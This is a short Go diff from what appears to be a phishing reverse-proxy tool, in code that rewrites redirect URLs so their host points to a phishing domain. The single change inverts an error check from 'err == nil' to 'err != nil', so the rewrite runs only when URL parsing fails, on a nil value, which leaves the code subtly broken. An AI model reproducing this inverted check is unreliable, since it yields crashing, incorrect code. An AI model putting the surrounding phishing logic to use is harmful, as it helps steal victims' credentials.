@@ -700,7 +700,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
 							if resp != nil {
 								r_url, err := url.Parse(s.RedirectURL)
-								if err == nil {
+								if err != nil {
 									if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
 										r_url.Host = r_host
 									}
